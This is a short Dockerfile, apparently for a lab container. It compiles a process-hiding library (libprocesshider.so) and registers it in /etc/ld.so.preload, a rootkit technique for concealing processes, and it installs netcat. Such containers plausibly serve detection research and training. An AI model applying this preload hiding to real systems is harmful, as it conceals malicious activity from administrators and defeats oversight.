FROM ubuntu

RUN apt update && apt install -y build-essential netcat net-tools xxd

COPY ./src /opt/src
WORKDIR /opt/src

RUN gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
RUN mv libprocesshider.so /usr/local/lib
RUN echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

ENTRYPOINT [ "sleep", "10000000" ]


